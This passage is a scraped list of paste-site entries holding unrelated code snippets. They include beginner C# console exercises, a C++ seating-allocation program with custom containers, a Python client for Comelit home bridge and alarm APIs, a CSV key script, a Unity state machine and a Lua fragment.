    Console.WriteLine($""No, he failed! He was {Math.Abs(recordInSeconds - swimmingTime):F2} seconds slower."");
}
"
Ks6Q8eLd,05.GodzillaVsKong,IvanITD,C#,Monday 15th of January 2024 05:20:02 PM CDT,"double movieBudget = double.Parse(Console.ReadLine());
int peopleAmount = int.Parse(Console.ReadLine());
double clothingPricePerOnePerson = double.Parse(Console.ReadLine());

double decorationPrice = movieBudget * 0.10;
double clothingPrice = peopleAmount * clothingPricePerOnePerson;

double discountforClothing = 0.0;

if (peopleAmount > 150)
{
    discountforClothing = clothingPrice * 0.10;
}

double totalClothing = clothingPrice - discountforClothing;

double totalPrice = decorationPrice + totalClothing;


double neededMoney = movieBudget - totalPrice;
double remainingMoney = totalPrice - movieBudget;


if (totalPrice > movieBudget)
{
    Console.WriteLine(""Not enough money!"");
    Console.WriteLine($""Wingard needs {Math.Abs(neededMoney):F2} leva more."");
}
else if (totalPrice <= movieBudget)
{
    Console.WriteLine(""Action!"");
    Console.WriteLine($""Wingard starts filming with {Math.Abs(remainingMoney):F2} leva left."");
}
"
HqeHtfRA,04.ToyShop,IvanITD,C#,Monday 15th of January 2024 05:19:15 PM CDT,"
double priceForExcursion = double.Parse(Console.ReadLine());
int puzzleAmount = int.Parse(Console.ReadLine());
int talkingDollsAmount = int.Parse(Console.ReadLine());
int tedyBearAmount = int.Parse(Console.ReadLine());
int minionsAmount = int.Parse(Console.ReadLine());
int trucksAmount = int.Parse(Console.ReadLine());

double totalToys = puzzleAmount + talkingDollsAmount + tedyBearAmount + minionsAmount + trucksAmount;

double puzzlePrice = puzzleAmount * 2.60;
double talkingDollPrice = talkingDollsAmount * 3;
double tedyBearPrice = tedyBearAmount * 4.10;
double minionsPrice = minionsAmount * 8.20;
double truckPrice = trucksAmount * 2;

double totalPrice = puzzlePrice + talkingDollPrice + tedyBearPrice + minionsPrice + truckPrice;

if (totalToys >= 50)
{
    double discount = totalPrice * 0.25;
    double discountFromTotalPrice = totalPrice - discount;

    double rentPrice = discountFromTotalPrice * 0.10;
    double profit = discountFromTotalPrice - rentPrice;

    if (profit >= priceForExcursion)
    {
        Console.WriteLine($""Yes! {profit - priceForExcursion:F2} lv left."");
    }
    else
    {
        Console.WriteLine($""Not enough money! {priceForExcursion - profit:F2} lv needed."");
    }
}
else
{
    double rentPrice = totalPrice * 0.10;
    double profit = totalPrice - rentPrice;

    if (profit >= priceForExcursion)
    {
        Console.WriteLine($""Yes! {profit - priceForExcursion:F2} lv left."");
    }
    else
    {
        Console.WriteLine($""Not enough money! {priceForExcursion - profit:F2} lv needed."");
    }
}
"
mNayGQ3x,03.TimeAnd15Minutes,IvanITD,C#,Monday 15th of January 2024 05:18:02 PM CDT,"int inputHours = int.Parse(Console.ReadLine());
int inputMinutes = int.Parse(Console.ReadLine());

int hoursToMinuts = inputHours * 60;

int totalMinuteTime = hoursToMinuts + inputMinutes;

totalMinuteTime += 15; // The 15 minutes from the assigment

int hours = 0;

int minutes = totalMinuteTime % 60;
hours = totalMinuteTime / 60;

if (hours == 24)
{
    hours = 0;
   
    if (minutes == 60)
    {
        hours++;
        minutes = 0;
    }
}

Console.WriteLine($""{hours}:{minutes:D2}"");"
iSpuB9qa,02.BonusScore,IvanITD,C#,Monday 15th of January 2024 05:17:18 PM CDT,"int startingPoints = int.Parse(Console.ReadLine());

double bonusPoints = 0.0;

if (startingPoints <= 100)
{
    bonusPoints += 5;

    if (startingPoints % 2 == 0)
    {
        bonusPoints++;

    }
    
    if (startingPoints % 10 == 5)
    {
        bonusPoints += 2;
    }

    double totalPoints = startingPoints + bonusPoints;

    Console.WriteLine(bonusPoints);
    Console.WriteLine(totalPoints);
}
else if (startingPoints > 100 && startingPoints <= 1000)
{
    bonusPoints = startingPoints * 0.20;

    if (startingPoints % 2 == 0)
    {
        bonusPoints++;

    }
    
    if (startingPoints % 10 == 5)
    {
        bonusPoints += 2;
    }

    double totalPoints = startingPoints + bonusPoints;

    Console.WriteLine(bonusPoints);
    Console.WriteLine(totalPoints);
}
else if (startingPoints > 1000)
{
    bonusPoints = startingPoints * 0.10;

    if (startingPoints % 2 == 0)
    {
        bonusPoints++;

    }
    
    if (startingPoints % 10 == 5)
    {
        bonusPoints += 2;
    }

    double totalPoints = startingPoints + bonusPoints;

    Console.WriteLine(bonusPoints);
    Console.WriteLine(totalPoints);
}
"
iAPy50zG,01.SumSeconds,IvanITD,C#,Monday 15th of January 2024 05:13:50 PM CDT,"int firstTime = int.Parse(Console.ReadLine());
int secondTime = int.Parse(Console.ReadLine());
int thirdTime = int.Parse(Console.ReadLine());

int totalTime = firstTime + secondTime + thirdTime;

int timeInMinutes = totalTime / 60;
int timeInSeconds = totalTime % 60;

Console.WriteLine($""{timeInMinutes}:{timeInSeconds:D2}"");"
hEQXsE5E,07.AreaOfFigures,IvanITD,C#,Monday 15th of January 2024 05:09:17 PM CDT,"string figureType = Console.ReadLine();

if (figureType == ""square"")
{
    double length = double.Parse(Console.ReadLine());
    double area = length * length;

    Console.WriteLine($""{area:F3}"");
}
else if (figureType == ""rectangle"")
{
    double lengthA = double.Parse(Console.ReadLine());
    double lengthB = double.Parse(Console.ReadLine());
    double area = lengthA * lengthB;

    Console.WriteLine($""{area:F3}"");
}
else if (figureType == ""circle"")
{
    double radius = double.Parse(Console.ReadLine());
    double area = Math.PI * radius * radius;

    Console.WriteLine($""{area:F3}"");
}
else if (figureType == ""triangle"")
{
    double lengthA = double.Parse(Console.ReadLine());
    double lengthB = double.Parse(Console.ReadLine());
    double area = lengthA * lengthB / 2;

    Console.WriteLine($""{area:F3}"");
}
"
Wtw4CVQ9,06.SpeedInfo,IvanITD,C#,Monday 15th of January 2024 05:08:26 PM CDT,"double pace = double.Parse(Console.ReadLine());

if (pace <= 10)
{
    Console.WriteLine(""slow"");
}
else if (pace > 10 && pace <= 50)
{
    Console.WriteLine(""average"");
}
else if (pace > 50 && pace <= 150)
{
    Console.WriteLine(""fast"");
}
else if (pace > 150 && pace <= 1000)
{
    Console.WriteLine(""ultra fast"");
}
else
{
    Console.WriteLine(""extremely fast"");
}
"
CD8tNUiF,05.Number100To200,IvanITD,C#,Monday 15th of January 2024 05:05:46 PM CDT,"int number = int.Parse(Console.ReadLine());

if (number < 100)
{
    Console.WriteLine(""Less than 100"");
}
else if (number >= 100 && number <= 200)
{
    Console.WriteLine(""Between 100 and 200"");
}
else
{
    Console.WriteLine(""Greater than 200"");
}
"
PSY76seu,03.EvenOrOdd,IvanITD,C#,Monday 15th of January 2024 04:56:59 PM CDT,"int number = int.Parse(Console.ReadLine());

if (number % 2 == 0)
{
    Console.WriteLine(""even"");
}
else
{
    Console.WriteLine(""odd"");
}
"
F2rnS0vg,02.GreateNumer,IvanITD,C#,Monday 15th of January 2024 04:45:27 PM CDT,"int num1 = int.Parse(Console.ReadLine());
int num2 = int.Parse(Console.ReadLine());

if (num1 > num2)
{
    Console.WriteLine(num1);
}
else
{
    Console.WriteLine(num2);
}
"
EECy9wVd,Untitled,cosenza987,C++,Monday 15th of January 2024 04:33:33 PM CDT,"#include <iostream>

template<class T, class U> class pair {
    public:
    T first;
    U second;
    bool operator < (const pair<T, U> b) const {
        if(this->first == b.first) {
            return this->second < b.second;
        }
        return this->first < b.first;
    }
};

void swap(pair<int, int> &a, pair<int, int> &b) {
    pair<int, int> tmp = a;
    a = b;
    b = tmp;
}

template<class T> class vector {
    T* arr;
    int sz;
    int cap;
public:
    vector() {
        sz = 0;
        cap = 1;
        arr = new T[cap];
    }
    void resize(int x) {
        T* tmp = new T[x];
        for(int i = 0; i < sz; i++) {
            tmp[i] = arr[i];
        }
        delete[] arr;
        arr = tmp;
        cap = sz = x;
    }
    void push_back(T x) {
        if (sz == cap) {
            T* tmp = new T[2 * cap];
            for (int i = 0; i < sz; i++) {
                tmp[i] = arr[i];
            }
            delete[] arr;
            arr = tmp;
            cap *= 2;
        }
        arr[sz++] = x;
    }
    void pop_back() {
        sz--;
    }
    int size() {
        return sz;
    }
    T& operator[](int i) {
        return arr[i];
    }
};

template<class T> class priority_queue {
    vector<T> heap;
    int size;
    bool cmp(T a, T b) {
        return b < a;
    }
    void heapify(int i) {
        int l = 2 * i + 1;
        int r = 2 * i + 2;
        int largest = i;
        if(l < size && cmp(heap[l], heap[i])) {
            largest = l;
        }
        if(r < size && cmp(heap[r], heap[largest])) {
            largest = r;
        }
        if(largest != i) {
            swap(heap[i], heap[largest]);
            heapify(largest);
        }
    }
public:
    priority_queue() {
        size = 0;
    }

    void push(T x) {
        heap.push_back(x);
        int i = size;
        size++;
        while (i > 0 && cmp(heap[i], heap[(i - 1) / 2])) {
            swap(heap[i], heap[(i - 1) / 2]);
            i = (i - 1) / 2;
        }
    }
    T top() {
        return heap[0];
    }
    void pop() {
        swap(heap[0], heap[size - 1]);
        size--;
        heap.pop_back();
        heapify(0);
    }
    int get_size() {
        return size;
    }
    void remove(int cadastro) {
        int ind = -1;
        for(int i = 0; i < size; i++) {
            if(heap[i].second == cadastro and ind == -1) {
                ind = i;
            }
        }
        swap(heap[ind], heap[size - 1]);
        size--;
        heap.pop_back();
        heapify(ind);
    }    
};

class hash_map {
    vector<vector<pair<int, int>>> table;
    static int mxsz;
    int size = 0;
    int get_hash(int key) {
        return key % mxsz;
    }
    int get(int key) {
        int hash = get_hash(key);
        for (int i = 0; i < table[hash].size(); i++) {
            if (table[hash][i].first == key) {
                return table[hash][i].second;
            }
        }
        return -1;
    }
public:
    hash_map() {
        table.resize(mxsz);
    }
    void insert(int key, int value) {
        int hash = get_hash(key);
        for (int i = 0; i < table[hash].size(); i++) {
            if (table[hash][i].first == key) {
                table[hash][i].second = value;
                return;
            }
        }
        table[hash].push_back({key, value});
        size++;
    }

    void erase(int key) {
        int hash = get_hash(key);
        for (int i = 0; i < table[hash].size(); i++) {
            if (table[hash][i].first == key) {
                swap(table[hash][i], table[hash][table[hash].size() - 1]);
                table[hash].pop_back();
                size--;
                return;
            }
        }
    }
    bool contains(int key) {
        int hash = get_hash(key);
        for (int i = 0; i < table[hash].size(); i++) {
            if (table[hash][i].first == key) {
                return true;
            }
        }
        return false;
    }
    int operator[](int key) {
        return get(key);
    }
};

int hash_map::mxsz = 1000000;

int main() {
    freopen(""in.txt"", ""r"", stdin);
    freopen(""out.txt"", ""w"", stdout);
    int f, q;
    std::cin >> f >> q;
    priority_queue<pair<int, int>> fileiras[f + 1], sem_assento;
    int n;
    std::cin >> n;
    std::string nomes[n + 1];
    int prioridades[n + 1];
    hash_map lugar;
    int cadastro_atual = 1;
    for(int _ = 0; _ < n; _++) {
        std::string type;
        std::cin >> type;
        if(type == ""CAD"") {
            std::string nome;
            int p;
            std::cin >> nome >> p;
            nomes[cadastro_atual] = nome;
            prioridades[cadastro_atual] = p;
            bool cadastrado = false;
            int fileira = -1;
            for(int i = 1; i <= f; i++) {
                if(fileiras[i].get_size() < q and !cadastrado) {
                    fileiras[i].push({-p, cadastro_atual});
                    fileira = i;
                    lugar.insert(cadastro_atual, i);
                    cadastrado = true;
                }
            }
            if(!cadastrado) {
                pair<int, int> mn = {INT_MAX, INT_MAX};
                int posicao = -1;
                for(int i = 1; i <= f; i++) {
                    pair<int, int> tmp = fileiras[i].top();
                    tmp.first = -tmp.first;
                    if(tmp.first < mn.first) {
                        mn = tmp;
                        posicao = i;
                    } else if(tmp.first == mn.first and tmp.second > mn.second) {
                        mn = tmp;
                        posicao = i;
                    }
                }
                bool inserir = true;
                if(p < mn.first) {
                    inserir = false;
                } else if(p == mn.first and cadastro_atual > mn.second) {
                    inserir = false;
                }
                if(inserir) {
                    cadastrado = true;
                    fileira = posicao;
                    sem_assento.push({mn.first, -mn.second});
                    lugar.insert(mn.second, 0);
                    fileiras[posicao].pop();
                    fileiras[posicao].push({-p, cadastro_atual});
                    lugar.insert(cadastro_atual, posicao);
                }
            }
            if(!cadastrado) {
                sem_assento.push({p, -cadastro_atual});
            }
            if(cadastrado) {
                std::cout << nome << "" ("" << cadastro_atual << "") foi alocado(a) na fileira "" << fileira << ""\n"";
            } else {
                std::cout << nome << "" ("" << cadastro_atual << "") nao foi alocado(a) em nenhuma fileira\n"";
            }
            cadastro_atual++;
        } else if(type == ""REM"") {
            std::string nome;
            int cad;
            std::cin >> nome >> cad;
            if(cad > n or nomes[cad] != nome or lugar[cad] == -1) {
                std::cout << ""Inexistente\n"";
            } else {
                if(lugar[cad] == 0) {
                    sem_assento.remove(cad);
                } else {
                    fileiras[lugar[cad]].remove(cad);
                    if(sem_assento.get_size()) {
                        pair<int, int> tmp = sem_assento.top();
                        sem_assento.pop();
                        fileiras[lugar[cad]].push({-tmp.first, -tmp.second});
                        lugar.insert(-tmp.second, lugar[cad]);
                    }
                }
                lugar.insert(cad, -1);
                std::cout << ""Removido(a)\n"";
            }
        } else if(type == ""VER"") {
            std::string nome;
            int cad;
            std::cin >> nome >> cad;
            if(cad > n or nomes[cad] != nome or lugar[cad] == -1) {
                std::cout << ""Inexistente\n"";
            } else {
                if(lugar[cad] == 0) {
                    std::cout << ""Sem assento\n"";
                } else {
                    std::cout << ""Sentado(a) na fileira "" << lugar[cad] << ""\n"";
                }
            }
        }
    }
    return 0;
}"
W7kg3pbj,VEDO api.py ( 15 Gen ),chemelli74,Python,Monday 15th of January 2024 04:00:30 PM CDT,"""""""Support for Comelit SimpleHome.""""""
import asyncio
import functools
from abc import abstractmethod
from dataclasses import dataclass
from datetime import datetime
from http.cookies import SimpleCookie
from typing import Any

import aiohttp
import pint
from yarl import URL

from .const import (
    _LOGGER,
    ALARM_AREA_STATUS,
    ALARM_AREAS,
    ALARM_ZONE_STATUS,
    ALARM_ZONES,
    BRIDGE,
    CLIMATE,
    COVER,
    IRRIGATION,
    LIGHT,
    OTHER,
    SCENARIO,
    SLEEP,
    STATE_COVER,
    STATE_ON,
    VEDO,
    WATT,
    AlarmAreaState,
    AlarmZoneState,
)
from .exceptions import CannotAuthenticate, CannotConnect, CannotRetrieveData


@dataclass
class ComelitSerialBridgeObject:
    """"""Comelit SimpleHome Serial bridge class.""""""

    index: int
    name: str
    status: int
    human_status: str
    type: str
    val: int | dict[Any, Any]  # Temperature or Humidity (CLIMATE)
    protected: int
    zone: str
    power: float
    power_unit: str = WATT


@dataclass
class ComelitVedoAreaObject:
    """"""Comelit SimpleHome VEDO area class.""""""

    index: int
    name: str
    p1: bool
    p2: bool
    ready: bool
    armed: bool
    alarm: bool
    alarm_memory: bool
    sabotage: bool
    anomaly: bool
    in_time: bool
    out_time: bool
    human_status: AlarmAreaState


@dataclass
class ComelitVedoZoneObject:
    """"""Comelit SimpleHome VEDO zone class.""""""

    index: int
    name: str
    status_api: str
    status: int
    human_status: AlarmZoneState


class ComelitCommonApi:
    """"""Common API calls for Comelit SimpleHome devices.""""""

    def __init__(self, host: str, port: int, pin: int) -> None:
        """"""Initialize the session.""""""
        self.host = f""{host}:{port}""
        self.device_pin = pin
        self.base_url = f""http://{host}:{port}""
        self._headers = {
            ""User-Agent"": ""Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"",
            #   ""Content-Type"": ""application/x-www-form-urlencoded; charset=UTF-8"",
            #   ""Accept-Language"": ""it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3"",
            #   ""Accept"": ""*/*"",
            ""Accept-Language"": ""en-GB,en;q=0.5"",
            ""X-Requested-With"": ""XMLHttpRequest"",
            ""Connection"": ""keep-alive"",
        }
        self._session: aiohttp.ClientSession

    async def _get_page_result(
        self, page: str, reply_json: bool = True
    ) -> tuple[int, dict[str, Any]]:
        """"""Return status and data from a GET query.""""""

        # Assure 1s between calls.
        _LOGGER.debug(""GET page sleep for %ss"", SLEEP)
        await asyncio.sleep(SLEEP)

        _LOGGER.debug(""GET page %s [%s]"", page, self.host)
        timestamp = datetime.now().strftime(""%Y-%m-%d %H:%M:%S"")
        url = f""{self.base_url}{page}&_={timestamp}""
        try:
            response = await self._session.get(
                url,
                headers=self._headers,
                timeout=10,
            )
        except (asyncio.TimeoutError, aiohttp.ClientConnectorError) as exc:
            raise CannotConnect(""Connection error during GET"") from exc

        _LOGGER.debug(""GET response %s [%s]"", await response.text(), self.host)

        if response.status != 200:
            raise CannotRetrieveData(f""GET response status {response.status}"")

        if not reply_json:
            _LOGGER.debug(""GET response is empty [%s]"", self.host)
            return response.status, {}

        return response.status, await response.json()

    async def _post_page_result(
        self, page: str, payload: dict[str, Any]
    ) -> SimpleCookie:
        """"""Return status and data from a POST query.""""""

        # Assure 1s between calls.
        _LOGGER.debug(""POST page sleep for %ss"", SLEEP)
        await asyncio.sleep(SLEEP)

        _LOGGER.debug(""POST page %s [%s]"", page, self.host)
        url = f""{self.base_url}{page}""
        try:
            response = await self._session.post(
                url,
                data=payload,
                headers=self._headers,
                timeout=10,
            )
        except (asyncio.TimeoutError, aiohttp.ClientConnectorError) as exc:
            raise CannotConnect(""Connection error during POST"") from exc

        _LOGGER.debug(""POST response %s [%s]"", await response.text(), self.host)

        if response.status != 200:
            raise CannotRetrieveData(f""POST response status {response.status}"")

        return response.cookies

    async def _is_session_active(self) -> bool:
        """"""Check if aiohttp session is still active.""""""
        if not hasattr(self, ""_session"") or self._session.closed:
            return False

        return True

    async def _check_logged_in(self, host_type: str) -> bool:
        """"""Check if login is active.""""""

        reply_status, reply_json = await self._get_page_result(""/login.json"")

        _LOGGER.debug(""%s login reply: %s"", host_type, reply_json)
        if host_type == BRIDGE:
            logged = reply_json[""domus""] != ""000000000000""
        else:
            logged = reply_json[""logged""] == 1

        return logged

    @abstractmethod
    async def login(self) -> bool:
        """"""Login to Comelit device.""""""

    async def _login(self, payload: dict[str, Any], host_type: str) -> bool:
        """"""Login into Comelit device.""""""
        _LOGGER.debug(""Logging into host %s [%s]"", self.host, host_type)

        if not await self._is_session_active():
            _LOGGER.debug(""Creating HTTP ClientSession"")
            jar = aiohttp.CookieJar(unsafe=True)
            connector = aiohttp.TCPConnector(force_close=True)
            self._session = aiohttp.ClientSession(cookie_jar=jar, connector=connector)

        if await self._check_logged_in(host_type):
            return True

        cookies = await self._post_page_result(""/login.cgi"", payload)
        _LOGGER.debug(""Cookies for host %s: %s"", self.host, cookies)

        if not cookies:
            _LOGGER.warning(
                ""Authentication failed for host %s [%s]: no cookies received"",
                self.host,
                host_type,
            )
            raise CannotAuthenticate

        self._session.cookie_jar.update_cookies(cookies, URL(self.base_url))

        return await self._check_logged_in(host_type)

    async def logout(self) -> None:
        """"""Comelit Simple Home logout.""""""
        if not await self._is_session_active():
            return

        payload = {""logout"": 1}
        await self._post_page_result(""/login.cgi"", payload)
        self._session.cookie_jar.clear()

    async def close(self) -> None:
        """"""Comelit Simple Home close session.""""""
        if await self._is_session_active():
            await self._session.close()


class ComeliteSerialBridgeApi(ComelitCommonApi):
    """"""Queries Comelit SimpleHome Serial bridge.""""""

    def __init__(self, host: str, port: int, bridge_pin: int) -> None:
        """"""Initialize the session.""""""
        super().__init__(host, port, bridge_pin)
        self._devices: dict[str, dict[int, ComelitSerialBridgeObject]] = {}

    async def _translate_device_status(self, dev_type: str, dev_status: int) -> str:
        """"""Makes status human readable.""""""

        if dev_type == COVER:
            return STATE_COVER[dev_status]

        return ""on"" if dev_status == STATE_ON else ""off""

    async def set_device_status(
        self, device_type: str, index: int, action: int
    ) -> bool:
        """"""Set device action.

        action:
            0 = off/close
            1 = on/open

        """"""
        reply_status = await self._get_page_result(
            f""/user/action.cgi?type={device_type}&num{action}={index}"", False
        )
        return reply_status == 200

    async def get_device_status(self, device_type: str, index: int) -> int:
        """"""Get device status.""""""
        reply_status, reply_json = await self._get_page_result(
            f""/user/icon_status.json?type={device_type}""
        )
        _LOGGER.debug(
            ""Device %s[%s] status: %s"", device_type, index, reply_json[""status""][index]
        )
        return reply_json[""status""][index]

    async def login(self) -> bool:
        """"""Login to Serial Bridge device.""""""
        payload = {""dom"": self.device_pin}
        return await self._login(payload, BRIDGE)

    async def get_all_devices(self) -> dict[str, dict[int, ComelitSerialBridgeObject]]:
        """"""Get all connected devices.""""""

        _LOGGER.debug(""Getting all devices for host %s"", self.host)

        loop = asyncio.get_running_loop()
        ureg = await loop.run_in_executor(
            None, functools.partial(pint.UnitRegistry, cache_folder="":auto:"")
        )
        ureg.default_format = ""~""

        for dev_type in (CLIMATE, COVER, LIGHT, IRRIGATION, OTHER, SCENARIO):
            reply_status, reply_json = await self._get_page_result(
                f""/user/icon_desc.json?type={dev_type}""
            )
            _LOGGER.debug(
                ""List of devices of type %s: %s"",
                dev_type,
                reply_json,
            )
            reply_counter_json: dict[str, Any] = {}
            if dev_type == OTHER and reply_json[""num""] > 0:
                reply_status, reply_counter_json = await self._get_page_result(
                    ""/user/counter.json""
                )
            devices = {}
            for i in range(reply_json[""num""]):
                # Guard against ""scenario"", that has 32 devices even if none is configured
                if reply_json[""desc""][i] == """":
                    continue
                status = reply_json[""status""][i]
                power = 0.0
                if instant_values := reply_counter_json.get(""instant""):
                    instant = ureg(instant_values[i])
                    if not instant.dimensionless:
                        power = ureg.convert(
                            instant.magnitude, str(instant.units), WATT
                        )
                dev_info = ComelitSerialBridgeObject(
                    index=i,
                    name=reply_json[""desc""][i],
                    status=status,
                    human_status=await self._translate_device_status(dev_type, status),
                    type=dev_type,
                    val=reply_json[""val""][i],
                    protected=reply_json[""protected""][i],
                    zone=reply_json[""env_desc""][reply_json[""env""][i]]
                    if not dev_type == SCENARIO
                    else """",
                    power=power,
                )
                devices.update({i: dev_info})
            self._devices.update({dev_type: devices})

        return self._devices


class ComelitVedoApi(ComelitCommonApi):
    """"""Queries Comelit SimpleHome VEDO alarm.""""""

    async def _translate_zone_status(
        self, zone: ComelitVedoZoneObject
    ) -> AlarmZoneState:
        """"""Translate ZONE status.""""""

        for status in ALARM_ZONE_STATUS:
            if zone.status & status != 0:
                return ALARM_ZONE_STATUS[status]

        return AlarmZoneState.REST

    async def _translate_area_status(
        self, area: ComelitVedoAreaObject
    ) -> AlarmAreaState:
        """"""Translate AREA status.""""""

        for field in ALARM_AREA_STATUS:
            if getattr(area, field):
                return ALARM_AREA_STATUS[field]

        return AlarmAreaState.DISARMED

    async def _create_area_object(
        self, json_area_desc: dict[str, Any], json_area_stat: dict[str, Any], index: int
    ) -> ComelitVedoAreaObject:
        """"""Get area status.""""""

        area = ComelitVedoAreaObject(
            index=index,
            name=json_area_desc[""description""][index],
            p1=json_area_desc[""p1_pres""][index],
            p2=json_area_desc[""p2_pres""][index],
            ready=json_area_stat[""ready""][index],
            armed=json_area_stat[""armed""][index],
            alarm=json_area_stat[""alarm""][index],
            alarm_memory=json_area_stat[""alarm_memory""][index],
            sabotage=json_area_stat[""sabotage""][index],
            anomaly=json_area_stat[""anomaly""][index],
            in_time=json_area_stat[""in_time""][index],
            out_time=json_area_stat[""out_time""][index],
            human_status=AlarmAreaState.UNKNOWN,
        )
        area.human_status = await self._translate_area_status(area)
        _LOGGER.debug(area)
        return area

    async def _create_zone_object(
        self, json_zone_desc: dict[str, Any], json_zone_stat: dict[str, Any], index: int
    ) -> ComelitVedoZoneObject:
        """"""Create zone object.""""""

        status_api = json_zone_stat[""status""].split("","")[index]

        zone = ComelitVedoZoneObject(
            index=index,
            name=json_zone_desc[""description""][index],
            status=int(status_api, 16),
            status_api=status_api,
            human_status=AlarmZoneState.UNKNOWN,
        )
        zone.human_status = await self._translate_zone_status(zone)
        _LOGGER.debug(zone)
        return zone

    async def set_zone_status(
        self, index: int, action: str, force: bool = False
    ) -> bool:
        """"""Set zone action.

        action:
            tot = enable
            dis = disable

        index:
            32 = all zones
             n = specific zone

        force:
            False = don't force action
            True  = force action

        """"""

        reply_status = await self._get_page_result(
            f""/action.cgi?vedo=1&{action}={index}&force={int(force)}"", False
        )
        return reply_status == 200

    async def login(self) -> bool:
        """"""Login to VEDO system.""""""
        payload = {""code"": self.device_pin}
        return await self._login(payload, VEDO)

    async def get_area_status(
        self, area: ComelitVedoAreaObject
    ) -> ComelitVedoAreaObject:
        """"""Get AREA status.""""""
        reply_status, reply_json_area_stat = await self._get_page_result(
            ""/user/area_stat.json""
        )
        _LOGGER.debug(""Alarm AREA statistics: %s"", reply_json_area_stat)

        if not reply_json_area_stat[""logged""]:
            raise CannotRetrieveData(""Logged is 0 in /user/area_stat.json"")

        description = {""description"": area.name, ""p1_pres"": area.p1, ""p2_pres"": area.p2}

        return await self._create_area_object(
            description, reply_json_area_stat, area.index
        )

    async def get_all_areas_and_zones(
        self,
    ) -> dict[str, dict[int, Any]]:
        """"""Get all VEDO system AREA and ZONE.""""""

        queries = {
            1: {""desc"": ""AREA description"", ""page"": ""/user/area_desc.json""},
            2: {""desc"": ""ZONE description"", ""page"": ""/user/zone_desc.json""},
            3: {""desc"": ""AREA statistics"", ""page"": ""/user/area_stat.json""},
            4: {""desc"": ""ZONE statistics"", ""page"": ""/user/zone_stat.json""},
        }
        reply_json_data: list[dict[Any, Any]] = []

        for info in queries.values():
            page = info[""page""]
            reply_status, reply_json = await self._get_page_result(page)
            _LOGGER.debug(""Alarm %s: %s"", info[""desc""], reply_json)
            if not reply_json[""logged""]:
                raise CannotRetrieveData(f""Logged is 0 in {page}"")
            reply_json_data.append(reply_json)

        list_areas: list[int] = reply_json_data[0][""present""]
        areas = {}
        for i in range(len(list_areas)):
            if not list_areas[i]:
                _LOGGER.debug(""Alarm skipping non present AREA [%i]"", i)
                continue
            area = await self._create_area_object(
                reply_json_data[0], reply_json_data[2], i
            )
            areas.update({i: area})

        list_zones: list[int] = reply_json_data[1][""present""]
        if ""1"" not in list_zones:
            raise CannotRetrieveData(""All zones not present in /user/zone_stat.json"")

        zones = {}
        for i in range(len(list_zones)):
            if not int(list_zones[i]):
                _LOGGER.debug(""Alarm skipping non present ZONE [%i]"", i)
                continue
            zone = await self._create_zone_object(
                reply_json_data[1], reply_json_data[3], i
            )
            zones.update({i: zone})

        return {ALARM_AREAS: areas, ALARM_ZONES: zones}
"
SSeF4Sws,"Python - Add ""Key"" to csv game script",CaiusNelson,Python,Monday 15th of January 2024 02:44:29 PM CDT,"import csv
import os

def update_csv_keys(file_path):
    try:
        # Extract the filename without extension for key generation
        filename = os.path.splitext(os.path.basename(file_path))[0]

        with open(file_path, mode='r', newline='') as file:
            # Reading the CSV file
            reader = csv.DictReader(file)
            rows = list(reader)

        # Clear existing content in the ""Key"" column
        for row in rows:
            row['Key'] = ''

        # Index for key generation
        key_index = 1
        added_keys = []

        # Update rows
        for row in rows:
            if row['Line']:  # Check if 'Line' column is not empty
                new_key = f'{filename}_{key_index}'
                row['Key'] = new_key
                added_keys.append(new_key)
                key_index += 1

        with open(file_path, mode='w', newline='') as file:
            # Writing back to the CSV file
            fieldnames = reader.fieldnames
            writer = csv.DictWriter(file, fieldnames=fieldnames)
            writer.writeheader()
            writer.writerows(rows)

        return added_keys

    except Exception as e:
        return f""An error occurred: {e}""

# Ask for the CSV file path
file_path = input(""Enter the path to the CSV file: "")
result = update_csv_keys(file_path)

# Check if the result is an error message or keys
if isinstance(result, list):
    # Print all added keys
    print(""\nAdded keys:"")
    for key in result:
        print(key)
    print(""\nCSV file has been updated."")
else:
    # Print the error message
    print(result)
"
xFrREK0c,Untitled,simtrip,C#,Monday 15th of January 2024 02:34:19 PM CDT,"using TMPro;
using UnityEngine;
using UnityEngine.UI;

public class StateMachine : MonoBehaviour
{
    public Button Option1;
    public Button Option2;
    public TMP_InputField Input;

    private void Start()
    {
        EnterState(new InitState(this));
    }

    public void EnterState(State state)
    {
        Option1.onClick.RemoveAllListeners();
        Option2.onClick.RemoveAllListeners();
        Input.text = string.Empty;
        
        Option1.onClick.AddListener(state.OnOption1);
        Option2.onClick.AddListener(state.OnOption2);
        Input.onSubmit.AddListener(state.OnInput);
        state.OnEnter();
    }
}

/// <summary>
/// Base class for a state
/// </summary>
public abstract class State
{
    protected StateMachine StateMachine;
    
    public State(StateMachine stateMachine)
    {
        StateMachine = stateMachine;
    }
    
    /// <summary>
    /// Called when the state is entered
    /// </summary>
    public virtual void OnEnter() {}
    
    /// <summary>
    /// Called when user presses first button
    /// </summary>
    public virtual void OnOption1() { }
    
    /// <summary>
    /// Called when user pressed second button
    /// </summary>
    public virtual void OnOption2() {}
    
    /// <summary>
    /// Called when user submits input in the inputfild
    /// </summary>
    /// <param name=""input""></param>
    public virtual void OnInput(string input) {}
}

/// <summary>
/// The entry state of the application
/// </summary>
public class InitState : State
{
    public InitState(StateMachine stateMachine) : base(stateMachine) {}

    public override void OnEnter()
    {
        Debug.Log(""You have started the game"");
    }

    public override void OnOption1()
    {
        // Go to Workshop State
        StateMachine.EnterState(new WorkshopState(StateMachine));
    }
    
    public override void OnOption2()
    {
        Debug.Log(""Does nothing"");
    }
}

public class WorkshopState : State
{
    public WorkshopState(StateMachine stateMachine) : base(stateMachine) {}

    public override void OnEnter()
    {
        Debug.Log(""You have entered the workshop"");
    }

    public override void OnOption1()
    {
        Debug.Log(""You have ugpraded car"");
    }
    
    public override void OnOption2()
    {
        // Go back to InitState
        StateMachine.EnterState(new InitState(StateMachine));
    } 
}
"
SxyZbimL,Untitled,aabb_aabb,Lua,Monday 15th of January 2024 02:23:28 PM CDT,"    local pos, ang = self:GetModelPositionInSights()
    local recoil_amt = self.RemainingRecoil * self:DeltaTime() * (2.5 - (1-FrameTime()))
    local angles = Angle()
    local ct,ft = CurTime(),FrameTime()
    local move = Vector(self.Owner:GetVelocity().x, self.Owner:GetVelocity().y, 0)
    local movement = move:LengthSqr()
    local movepercent = math.Clamp(movement/self.Owner:GetRunSpeed()^3, 0, 1)

    ang.p = ang.p - recoil_amt * self.RecoilVisualAngles.p 
    ang.y = ang.y - recoil_amt * self.RecoilVisualAngles.y 
